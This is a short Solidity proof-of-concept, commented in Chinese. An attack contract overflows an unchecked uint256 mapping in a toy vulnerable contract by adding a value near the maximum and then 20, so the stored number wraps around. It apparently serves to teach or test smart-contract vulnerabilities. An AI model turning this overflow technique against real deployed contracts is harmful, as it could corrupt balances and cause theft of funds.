// 攻擊合約，利用整數溢位漏洞
contract AttackIntegerOverflow {
    // 引用漏洞合約
    IntegerOverflowMappingSym1 vulnerable;

    // 在部署時傳入漏洞合約的位址
    constructor(address _vulnerable) public {
        vulnerable = IntegerOverflowMappingSym1(_vulnerable);
    }

    // 攻擊流程：
    // Step 1: 初始化 key 值對應的數字接近 uint256 最大值
    // Step 2: 呼叫 init 加入一個造成溢位的數字，使得最終數值回繞 (wrap around)，可能造成邏輯錯誤
    function attack(uint256 k) public {
        // 由於 uint256 最大值為 2**256 - 1，因此可以先加到一個很大的數值
        // 例如：先設定 map[k] 為 (2**256 - 10)，再加上 20 則會發生 overflow
        vulnerable.init(k, type(uint256).max - 9);
        vulnerable.init(k, 20);
    }
}

// 漏洞合約的介面 (interface)，方便攻擊合約呼叫
contract IntegerOverflowMappingSym1 {
    mapping(uint256 => uint256) map;
    function init(uint256 k, uint256 v) public { map[k] += v; }
}